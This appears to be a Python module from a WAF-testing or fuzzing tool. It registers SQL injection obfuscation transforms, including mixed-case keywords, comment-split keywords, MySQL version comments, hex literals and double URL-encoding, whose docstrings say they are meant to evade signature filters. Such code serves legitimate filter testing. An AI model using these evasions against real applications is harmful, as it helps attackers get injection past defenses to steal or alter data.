"""SQL injection payload obfuscation."""
from __future__ import annotations

import re

from ..encodings import percent_double_encode
from . import Payload, register

#: Keyword rewrites: substring -> substitution. Order matters (longest first).
_CASE = {"SELECT": "SeLeCt", "UNION": "UnIoN", "FROM": "FrOm",
         "WHERE": "WhErE", "AND": "aNd", "OR": "oR"}
_INLINE = {"UNION": "UN/**/ION", "SELECT": "SE/**/LECT",
           "FROM": "FR/**/OM", "WHERE": "WH/**/ERE"}
_VERSION = {"UNION": "/*!50000UNION*/", "SELECT": "/*!50000SELECT*/"}

_QUOTED_WORD = re.compile(r"'(\w+)'")


def _rewrite(payload: str, table: "dict[str, str]") -> str:
    out = payload
    for key, value in table.items():
        out = out.replace(key, value)
    return out


@register(Payload(
    id="sqli_case_toggle", category="sqli",
    explain="mixed-case SQL keywords (SELECT -> SeLeCt)",
    fidelity="transparent",
))
def sqli_case_toggle(payload: str) -> str:
    """Rewrite uppercase SQL keywords to mixed case. SQL is case-insensitive."""
    return _rewrite(payload, _CASE)


@register(Payload(
    id="sqli_inline_comment", category="sqli",
    explain="split keywords with inline comments (UNION -> UN/**/ION)",
    fidelity="differential",
))
def sqli_inline_comment(payload: str) -> str:
    """Break keyword letter runs with ``/**/`` so regex anchors miss them."""
    return _rewrite(payload, _INLINE)


@register(Payload(
    id="sqli_version_comment", category="sqli",
    explain="wrap keywords in MySQL version comments (/*!50000UNION*/)",
    fidelity="differential",
))
def sqli_version_comment(payload: str) -> str:
    """Wrap keywords in version-gated comments executed on MySQL >= 5.0."""
    return _rewrite(payload, _VERSION)


@register(Payload(
    id="sqli_hex_quote", category="sqli",
    explain="rewrite quoted literals as hex ('' -> 0x... )",
    fidelity="transparent",
))
def sqli_hex_quote(payload: str) -> str:
    """Replace ``'word'`` with ``0x<hex>`` so quote/string signatures vanish."""
    return _QUOTED_WORD.sub(
        lambda m: "0x" + m.group(1).encode("utf-8").hex(), payload,
    )


@register(Payload(
    id="sqli_double_encode", category="sqli",
    explain="double URL-encode the payload (% -> %25)",
    fidelity="differential",
))
def sqli_double_encode(payload: str) -> str:
    """Double-encode so a single-decoding WAF sees noise, the app decodes once more."""
    return percent_double_encode(payload)


@register(Payload(
    id="sqli_whitespace_sub", category="sqli",
    explain="replace spaces with /**/",
    fidelity="transparent",
))
def sqli_whitespace_sub(payload: str) -> str:
    """Swap ASCII spaces for inline comments; SQL treats both as whitespace."""
    return payload.replace(" ", "/**/")


@register(Payload(
    id="sqli_comment_extend", category="sqli",
    explain="append --waf to a trailing comment",
    fidelity="differential",
))
def sqli_comment_extend(payload: str) -> str:
    """Extend a trailing ``--``/``#`` comment with benign text."""
    if "--" in payload or "#" in payload:
        return payload + "--waf"
    return payload
